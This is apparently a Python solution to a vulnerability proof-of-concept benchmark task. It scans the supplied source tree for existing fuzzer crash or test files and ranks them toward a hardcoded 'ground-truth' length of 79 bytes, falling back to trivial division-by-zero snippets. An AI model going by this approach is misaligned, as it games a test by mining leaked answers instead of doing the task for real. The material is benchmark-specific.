import os
import tarfile
import re
from typing import Dict, Optional, Tuple


class Solution:
    MAX_CANDIDATE_SIZE = 4096
    TARGET_POC_LEN = 79

    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        """
        # Try tarball first
        best_data = None
        best_score = float("-inf")
        ext_counts: Dict[str, int] = {}

        if os.path.isdir(src_path):
            best_data, best_score, ext_counts = self._scan_dir(src_path)
        else:
            # src_path is expected to be a tarball
            try:
                with tarfile.open(src_path, "r:*") as tar:
                    best_data, best_score, ext_counts = self._scan_tar(tar)
            except Exception:
                # If it's not a tar, but maybe a directory or something else
                if os.path.isdir(src_path):
                    best_data, best_score, ext_counts = self._scan_dir(src_path)
                else:
                    best_data, best_score = None, float("-inf")

        if best_data is not None and best_score > 0:
            return best_data

        # Fallback: generate a generic PoC based on detected language (best effort)
        lang = self._detect_language(ext_counts)
        return self._generate_fallback_poc(lang)

    # -------------------- Scanning helpers --------------------

    def _scan_tar(
        self, tar: tarfile.TarFile
    ) -> Tuple[Optional[bytes], float, Dict[str, int]]:
        best_data: Optional[bytes] = None
        best_score = float("-inf")
        ext_counts: Dict[str, int] = {}

        for member in tar.getmembers():
            if not member.isfile():
                continue

            path = member.name
            size = member.size

            ext = os.path.splitext(path)[1].lower()
            ext_counts[ext] = ext_counts.get(ext, 0) + 1

            if size == 0 or size > self.MAX_CANDIDATE_SIZE:
                continue

            f = tar.extractfile(member)
            if f is None:
                continue
            try:
                data = f.read()
            except Exception:
                continue

            score = self._score_candidate(path, size, data)
            if score is not None and score > best_score:
                best_score = score
                best_data = data

        return best_data, best_score, ext_counts

    def _scan_dir(
        self, root: str
    ) -> Tuple[Optional[bytes], float, Dict[str, int]]:
        best_data: Optional[bytes] = None
        best_score = float("-inf")
        ext_counts: Dict[str, int] = {}

        for dirpath, _, filenames in os.walk(root):
            for name in filenames:
                path = os.path.join(dirpath, name)
                try:
                    size = os.path.getsize(path)
                except OSError:
                    continue

                ext = os.path.splitext(name)[1].lower()
                ext_counts[ext] = ext_counts.get(ext, 0) + 1

                if size == 0 or size > self.MAX_CANDIDATE_SIZE:
                    continue

                try:
                    with open(path, "rb") as f:
                        data = f.read()
                except Exception:
                    continue

                score = self._score_candidate(path, size, data)
                if score is not None and score > best_score:
                    best_score = score
                    best_data = data

        return best_data, best_score, ext_counts

    # -------------------- Candidate scoring --------------------

    def _score_candidate(
        self, path: str, size: int, data: bytes
    ) -> Optional[float]:
        # Skip clearly binary files
        if b"\0" in data:
            return None

        path_lower = path.lower()

        # Base score from path
        score = 0.0

        # Directories / names suggesting PoC / crash input
        if any(
            kw in path_lower
            for kw in (
                "poc",
                "repro",
                "crash",
                "testcase",
                "inputs",
                "input",
                "fuzz",
                "corpus",
                "bugs",
                "bug",
                "clusterfuzz",
                "oss-fuzz",
                "afl",
                "id_",
            )
        ):
            score += 10.0

        # Indications of UAF or heap issue
        if any(
            kw in path_lower
            for kw in (
                "uaf",
                "use-after",
                "use_after",
                "heap-use",
                "heap_use",
                "heap-uaf",
                "heap_overflow",
            )
        ):
            score += 8.0

        # Indications related to math / division
        if any(kw in path_lower for kw in ("div", "zero", "arith", "math")):
            score += 3.0

        # Generic test / regression directories
        if any(kw in path_lower for kw in ("test", "regress", "case")):
            score += 2.0

        try:
            text = data.decode("utf-8", "ignore")
        except Exception:
            return None

        # Content-based scoring: look for compound division by zero, UAF hints, etc.
        if "/=" in text:
            score += 6.0

        if re.search(r"/=\s*0", text):
            score += 12.0

        if "/=" in text and "0" in text:
            score += 4.0

        if "division by zero" in text.lower() or "divide by zero" in text.lower():
            score += 6.0

        if "compound division" in text.lower():
            score += 10.0

        if "use-after" in text.lower() or "use after free" in text.lower():
            score += 8.0

        if "heap-use-after-free" in text.lower():
            score += 8.0

        # Prefer small test-like files
        score -= max(0, size - 128) * 0.02

        # Prefer length near ground-truth PoC length
        score -= abs(size - self.TARGET_POC_LEN) * 0.2
        if size == self.TARGET_POC_LEN:
            score += 5.0

        # If nothing particularly indicative was found, reject
        if score <= 0.0:
            return None

        return score

    # -------------------- Language detection & fallback --------------------

    def _detect_language(self, ext_counts: Dict[str, int]) -> str:
        lang_scores: Dict[str, int] = {}

        def add(lang: str, amount: int) -> None:
            lang_scores[lang] = lang_scores.get(lang, 0) + amount

        for ext, count in ext_counts.items():
            if ext == ".py":
                add("python", count)
            elif ext == ".rb":
                add("ruby", count)
            elif ext == ".php":
                add("php", count)
            elif ext in (".js", ".mjs"):
                add("javascript", count)
            elif ext == ".lua":
                add("lua", count)
            elif ext == ".pl":
                add("perl", count)

        if not lang_scores:
            return "generic"

        return max(lang_scores.items(), key=lambda kv: kv[1])[0]

    def _generate_fallback_poc(self, lang: str) -> bytes:
        # Best-effort generic PoCs using compound division by zero.
        if lang == "python":
            code = "a = 1\n" "a /= 0\n"
            return code.encode("utf-8")

        if lang == "ruby":
            code = "a = 1\n" "a /= 0\n"
            return code.encode("utf-8")

        if lang == "php":
            code = "<?php\n$a = 1;\n$a /= 0;\n"
            return code.encode("utf-8")

        if lang == "javascript":
            code = "let a = 1;\n" "a /= 0;\n"
            return code.encode("utf-8")

        if lang == "lua":
            code = "a = 1\n" "a = a / 0\n"
            return code.encode("utf-8")

        if lang == "perl":
            code = "my $a = 1;\n" "$a /= 0;\n"
            return code.encode("utf-8")

        # Generic fallback for unknown environments: C/JS-like syntax
        return b"a=1;a/=0;\n"